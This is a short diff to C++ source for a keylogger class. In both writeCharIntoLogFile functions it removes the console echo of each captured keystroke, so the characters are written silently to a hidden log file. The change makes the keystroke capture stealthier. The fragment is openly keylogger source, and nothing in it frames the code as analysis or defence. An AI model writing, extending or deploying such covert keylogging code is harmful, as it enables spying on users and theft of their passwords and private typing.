@@ -124,7 +124,6 @@ bool KeyLogger::checkAltGr() {
 }
 
 void KeyLogger::writeCharIntoLogFile(const char *string) {
-    std::cout << string;
     if (!std::filesystem::exists(pathOfLogs)) std::filesystem::create_directory(pathOfLogs);
     std::ofstream fileStream;
     fileStream.open(logsFileName.c_str(), std::fstream::app);
@@ -137,7 +136,6 @@ void KeyLogger::writeCharIntoLogFile(const char *string) {
 }
 
 void KeyLogger::writeCharIntoLogFile(char string) {
-    std::cout << string;
     if (!std::filesystem::exists(pathOfLogs)) std::filesystem::create_directory(pathOfLogs);
     std::ofstream fileStream;
     fileStream.open(logsFileName.c_str(), std::fstream::app);
